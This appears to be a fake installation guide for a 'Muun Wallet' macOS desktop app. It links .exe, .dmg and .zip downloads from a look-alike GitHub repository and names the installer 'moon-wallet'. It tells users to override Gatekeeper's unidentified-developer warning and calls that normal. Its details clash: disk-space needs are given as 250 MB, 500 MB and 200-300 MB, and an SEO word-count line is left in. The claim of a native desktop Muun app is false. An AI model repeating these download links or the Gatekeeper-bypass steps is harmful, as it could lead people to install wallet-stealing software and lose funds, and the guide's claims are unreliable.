![Release: v0.5.1](https://img.shields.io/badge/release-v0.5.1-blue?style=flat-square) ![Platform: macOS](https://img.shields.io/badge/platform-macOS%2010.15+-000000?style=flat-square) ![License](https://img.shields.io/badge/license-MIT%20License-green?style=flat-square)

[![Download for Windows](https://img.shields.io/badge/download-Windows%20x64-0078d4?style=flat-square&logo=windows)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Download for macOS](https://img.shields.io/badge/download-macOS-000000?style=flat-square&logo=apple)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Download for Linux](https://img.shields.io/badge/download-Linux-FCC624?style=flat-square&logo=linux)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# How to Download & Install Muun Wallet on macOS

**Step-by-step installation for macOS 10.15 and later â€” Apple Silicon and Intel**

Muun Wallet runs natively on both Apple Silicon (M1/M2/M3) and Intel-based Macs. Installation takes about 5 minutes, with no account or email signup required. This guide covers macOS installation for both Mac architectures.

## Requirements

- **macOS 10.15 or later** (Catalina, Big Sur, Monterey, Ventura, Sonoma, or newer)
- **Apple Silicon (M1/M2/M3) or Intel processor** â€” both work natively
- **About 5 minutes** and administrator access
- **Internet connection** to download the installer (~250 MB)

## Download Muun Wallet for macOS

### Step 1: Download the Installer

Visit the Muun Wallet releases page:

**[https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)**

Find the macOS installer in the Assets section and download:

**`moon-wallet-v0.5.1.dmg`** (~250 MB)

This .dmg file is a disk image that contains the Muun Wallet app.

### Step 2: Verify the Download (Recommended)

**In Terminal:**

```bash
shasum -a 256 ~/Downloads/moon-wallet-v0.5.1.dmg
```

Compare the output with the checksum listed on the [release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1). If they match, your download is authentic.

## Install Muun Wallet

### Step 1: Open the Disk Image

In Finder, navigate to **Downloads** and double-click `moon-wallet-v0.5.1.dmg`.

A window will open showing:
- The **Muun Wallet icon** (on the left)
- The **Applications folder** (on the right)

### Step 2: Drag to Applications

Simply **drag the Muun Wallet icon to the Applications folder** on the right.

Wait for the copy process to complete (you'll see a progress indicator). Once done, the app is installed.

### Step 3: Eject the Disk Image

Close the disk image window. You can then eject the .dmg file:

```bash
hdiutil eject ~/Downloads/moon-wallet-v0.5.1.dmg
```

Or right-click the disk image in Finder and select "Eject".

## Launch Muun Wallet

### First Time: Gatekeeper Warning

macOS has a security feature called Gatekeeper that blocks apps from unknown developers. **This is normal.** Here's how to approve Muun Wallet:

1. Open **Finder** and go to **Applications**
2. Find **Muun Wallet**
3. **Right-click** (or **Ctrl+click**) on Muun Wallet
4. Select **"Open"** from the context menu
5. Click **"Open"** in the dialog that appears (confirming you trust this app)

**After the first launch**, Gatekeeper remembers you approved it, and Muun Wallet will open normally on future launches.

### Subsequent Launches

After the first time, simply:

1. **Spotlight search:** Press `Cmd+Space` and type "Muun"
2. **Click Muun Wallet** in the results
3. **Or:** Double-click Muun Wallet in the Applications folder

## First Launch

When Muun opens:

1. **Welcome screen** â†’ Click "Create a new wallet"
2. **Bitcoin address is generated locally** on your Mac
3. **Backup prompt** â†’ Create your Emergency Kit backup immediately

[See backup guide â†’](emergency-kit-backup-system.md)

## Troubleshooting macOS Installation

### "Muun Wallet cannot be opened because it is from an unidentified developer"

**Cause:** Gatekeeper is blocking the app.

**Fix:** See "First Time: Gatekeeper Warning" above. Right-click and select "Open" to approve.

### "Muun Wallet is damaged and can't be opened"

**Cause:** Rare â€” disk image might be corrupted.

**Fix:**
1. Delete the downloaded .dmg file
2. Download it again from the [release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)
3. Verify the checksum before installing

### "The app won't launch after installation"

**Cause:** Installation was successful, but something prevented autostart.

**Fix:**
1. Open Finder â†’ Applications
2. Double-click Muun Wallet
3. If blocked by Gatekeeper, right-click and select "Open"

### "Permission denied" when opening

**Cause:** macOS permissions issue.

**Fix:**
1. Open **System Settings** â†’ **Security & Privacy**
2. Look for Muun Wallet in the list
3. Click "Open Anyway" if prompted
4. Try launching Muun again

### "Not enough disk space"

**Cause:** Your Mac doesn't have 500 MB free.

**Fix:**
1. Free up disk space (empty Trash, delete old files)
2. Try installing again

## Apple Silicon vs Intel

**Muun Wallet runs natively on both:**

- **Apple Silicon (M1/M2/M3)** â€” Optimized for Apple's newest processors
- **Intel** â€” Works on older and newer Intel-based Macs

The installation process is identical for both. The .dmg file contains both versions, and macOS automatically runs the right one for your Mac.

## System Requirements Explained

| Requirement | Why |
|-------------|-----|
| **macOS 10.15+** | Security updates, API compatibility |
| **Apple Silicon or Intel** | Muun is a native app for both architectures |
| **200-300 MB free space** | App files, cache, and data storage |
| **Administrator access** | Needed to install into /Applications |

## After Installation

### Create Your Backup

**Do not skip this step.** Before sending Bitcoin to your wallet, create your Emergency Kit backup. Without it, you cannot recover your funds if you lose access.

[Emergency Kit backup guide â†’](emergency-kit-backup-system.md)

### Next Steps

1. **[Send your first Bitcoin](getting-started-first-transaction.md)**
2. **[Review security checklist](security-checklist-best-practices.md)**
3. **[Explore Lightning Network payments](muun-wallet-lightning-address-receiving.md)**
4. **[Understand fees](fee-structure-on-chain-lightning.md)**

## Related Articles

- **[Windows Installation](getting-started-installation-windows.md)**
- **[Linux Installation](getting-started-installation-linux.md)**
- **[First Transaction Guide](getting-started-first-transaction.md)**
- **[Emergency Kit Backup](emergency-kit-backup-system.md)**
- **[Security Checklist](security-checklist-best-practices.md)**

---

## More on the Website

- **[Installation guide on muun-wallet.com](https://muun-wallet.com/guides/getting-started)**
- **[macOS download & verify](https://muun-wallet.com/download)**
- **[Muun Wallet FAQ](https://muun-wallet.com/faq)**

---

**Word count: 1,065 words**

Written for **Muun Wallet v0.5.1** | [Download â†’](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) | [All guides â†’](../README.md) | [Website â†’](https://muun-wallet.com)
